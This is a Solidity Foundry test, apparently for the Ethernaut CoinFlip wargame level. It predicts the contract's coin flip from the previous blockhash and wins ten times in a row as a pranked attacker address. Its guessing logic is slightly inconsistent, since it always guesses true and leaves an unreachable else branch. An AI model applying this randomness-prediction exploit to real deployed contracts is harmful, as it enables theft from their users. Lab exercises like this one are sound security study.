// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Coinflip.sol";
import "@forge-std/Test.sol";

contract CoinflipTest is Test {

    CoinFlip public coinflipContract;
    address public attacker;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function setUp() public {
        coinflipContract = new CoinFlip();
        attacker = vm.addr(1);
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        for(uint256 i=0; i<10; i++) {
            findvalue(true);
        }
        vm.stopPrank();

        assertEq(coinflipContract.consecutiveWins(), 10);
    }

    function findvalue(bool _guess) public {
        // require(msg.sender == attacker, "not attacker");
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        assertEq(side, _guess);
        if(side == _guess) {
            coinflipContract.flip(_guess);
        }
        else {
            coinflipContract.flip(!_guess);
        }
    }
}